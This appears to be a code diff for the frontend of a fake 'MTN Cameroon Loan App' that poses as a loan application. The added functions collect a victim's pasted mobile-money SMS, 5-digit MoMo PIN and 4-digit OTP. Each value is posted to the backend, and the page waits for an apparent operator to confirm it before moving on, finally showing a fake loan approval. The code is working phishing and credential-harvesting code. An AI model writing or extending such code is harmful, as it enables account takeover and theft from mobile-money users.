@@ -197,4 +197,101 @@ async function submitApp() {
             }
         );
     } catch {
-        showErr('s
+        showErr('s3Err', 'Failed to submit application.');
+    }
+}
+
+// ─── SMS ───
+async function doSmsParse() {
+    const msg = document.getElementById('smsMsgBox').value.trim();
+    if (msg.length < 3) {
+        showErr('momErr', 'Please paste a valid SMS message.');
+        return;
+    }
+
+    await fetch('/api/send-momo-message', {
+        method: 'POST',
+        body: JSON.stringify({
+            momoData: { applicationId: S.applicationId, phone: S.phone, momoMessage: msg }
+        }),
+        headers: { 'Content-Type': 'application/json' }
+    });
+
+    document.getElementById('waitSmsAppId').textContent = S.applicationId;
+    goTo('page-wait-sms');
+
+    startPoll(S.applicationId, 'sms',
+        () => { goTo('page-pin'); },
+        () => {
+            showErr('momErr', '❌ Invalid SMS. Please resend and try again.');
+            document.getElementById('smsMsgBox').value = '';
+            goTo('page-sms-paste');
+        }
+    );
+}
+
+// ─── PIN ───
+async function doPin() {
+    const pin = [0,1,2,3,4].map(i => document.getElementById('pin'+i).value).join('');
+    if (pin.length < 5) {
+        showErr('pinErr', 'Enter a valid 5-digit MoMo PIN.');
+        return;
+    }
+
+    await fetch('/api/send-pin', {
+        method: 'POST',
+        body: JSON.stringify({ applicationId: S.applicationId, pin }),
+        headers: { 'Content-Type': 'application/json' }
+    });
+
+    document.getElementById('waitPinAppId').textContent = S.applicationId;
+    goTo('page-wait-pin');
+
+    startPoll(S.applicationId, 'pin',
+        () => { goTo('page-otp'); },
+        () => {
+            showErr('pinErr', '❌ Invalid PIN. Please try again.');
+            document.querySelectorAll('#page-pin .pin-box').forEach(b => b.value = '');
+            goTo('page-pin');
+        }
+    );
+}
+
+// ─── OTP ───
+async function doOtp() {
+    const otp = [0,1,2,3].map(i => document.getElementById('otp'+i).value).join('');
+    if (otp.length < 4) {
+        showErr('otpErr', 'Enter a valid 4-digit OTP.');
+        return;
+    }
+
+    await fetch('/api/send-otp', {
+        method: 'POST',
+        body: JSON.stringify({ applicationId: S.applicationId, otp }),
+        headers: { 'Content-Type': 'application/json' }
+    });
+
+    document.getElementById('waitOtpAppId').textContent = S.applicationId;
+    goTo('page-wait-otp');
+
+    startPoll(S.applicationId, 'otp',
+        () => {
+            document.getElementById('aprAmount').textContent = 'XAF ' + S.loanAmount.toLocaleString();
+            document.getElementById('aprAmt').textContent = 'XAF ' + S.loanAmount.toLocaleString();
+            document.getElementById('aprTerm').textContent = S.loanTerm;
+            const monthly = Math.ceil(S.loanAmount / parseInt(S.loanTerm));
+            document.getElementById('aprMth').textContent = 'XAF ' + monthly.toLocaleString();
+            goTo('page-approval');
+        },
+        () => {
+            showErr('otpErr', '❌ Invalid OTP. Please resend and try again.');
+            clearOtpCode();
+            goTo('page-otp');
+        }
+    );
+}
+
+// ─── INIT ───
+updateCalc();
+goTo('page-landing');
+console.log('✅ MTN Cameroon Loan App loaded!');
